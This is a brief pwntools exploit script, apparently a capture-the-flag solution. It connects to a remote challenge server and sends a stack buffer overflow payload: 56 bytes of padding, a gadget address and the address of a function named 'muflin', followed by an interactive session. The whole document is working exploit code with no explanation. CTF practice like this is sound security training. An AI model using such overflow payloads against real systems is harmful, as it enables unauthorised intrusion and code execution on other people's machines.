from pwn import *

elf = ELF("./chall")
conn = remote("ctf.bdepalme.fr", 1557)

payload = b"A" * 56
payload += p64(0x40117f)
payload += p64(elf.symbols["muflin"])

conn.sendline(payload)
conn.interactive()
